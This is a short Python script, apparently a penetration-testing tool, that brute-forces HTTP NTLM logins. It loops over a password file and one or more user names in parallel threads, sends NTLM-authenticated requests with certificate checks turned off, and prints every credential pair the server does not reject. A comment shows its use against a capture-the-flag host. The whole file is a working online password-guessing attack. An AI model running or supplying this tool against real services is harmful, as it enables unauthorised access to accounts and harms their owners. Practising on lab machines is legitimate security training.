#!/usr/bin/python3

# NTLM Cracking tool
# Óscar Andreu 
import os
import sys
import argparse
import subprocess
import concurrent.futures
import pycurl
import io

def checkPassword(url, domain, user, password):    
    creds = f"{domain}{user}:{password}"

    curl = pycurl.Curl()
    curl.setopt(pycurl.URL, url)
    curl.setopt(pycurl.SSL_VERIFYPEER, 0)
    curl.setopt(pycurl.HEADER, True)
    curl.setopt(pycurl.NOBODY, True)
    curl.setopt(pycurl.WRITEFUNCTION, lambda bytes: len(bytes))
    curl.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
    curl.setopt(pycurl.USERPWD, creds)
    curl.perform()
    
    statusCode = curl.getinfo(curl.RESPONSE_CODE)      
    curl.close()
    if(statusCode != 401):
        print(f'{statusCode} - {creds}')    


if __name__ == "__main__":

    parser=argparse.ArgumentParser(
        description='HTTP NTLM cracking tool',
        epilog="")

    parser.add_argument('-p', metavar='<passwordsFile>', help='Passwords file', required=True)
    parser.add_argument('-s', metavar='<serviceURL>', help='Service URL', required=True)

    parser.add_argument('-d', metavar='<domain>', help='Domain name', default="")
    parser.add_argument('-u', metavar='<user>', help='User name', default="")
    parser.add_argument('-U', metavar='<usersFile>', help='Users file', default="")
    parser.add_argument('-t', metavar='<threads>', help='Number of threads, default 5', default=5)

    args = parser.parse_args()
    passFile = args.p
    url = args.s
    threads = args.t
    domain = args.d
    if(args.d):
        domain += "\\"

    # Load users, or single user from args.u o a list of users from args.U
    if(args.u):
        users =[args.u]
    elif(args.U):
        users = open(args.U, "r").read().splitlines()
    else:
        print("You must provide a user name or a file with user names")
        print()
        parser.print_help()
        sys.exit()

    print(users)
    passwords = open(passFile, "r").read().splitlines()

    # python3 http_ntlm_brute.py -s http://devops.worker.htb -u nathen -p passwords -d worker     
    print("""\

    _   _ _____ _____ ____    _   _ _____ _     __  __                       _    _               _              _ 
    | | | |_   _|_   _|  _ \  | \ | |_   _| |   |  \/  |   ___ _ __ __ _  ___| | _(_)_ __   __ _  | |_ ___   ___ | |
    | |_| | | |   | | | |_) | |  \| | | | | |   | |\/| |  / __| '__/ _` |/ __| |/ | | '_ \ / _` | | __/ _ \ / _ \| |
    |  _  | | |   | | |  __/  | |\  | | | | |___| |  | | | (__| | | (_| | (__|   <| | | | | (_| | | || (_) | (_) | |
    |_| |_| |_|   |_| |_|     |_| \_| |_| |_____|_|  |_|  \___|_|  \__,_|\___|_|\_|_|_| |_|\__, |  \__\___/ \___/|_|
                                                                                            |___/                                  

    """)

    with concurrent.futures.ThreadPoolExecutor(max_workers = threads) as executor:
        for password in passwords:
            for user in users:
                executor.submit(checkPassword, url=url, domain=domain, user=user, password=password)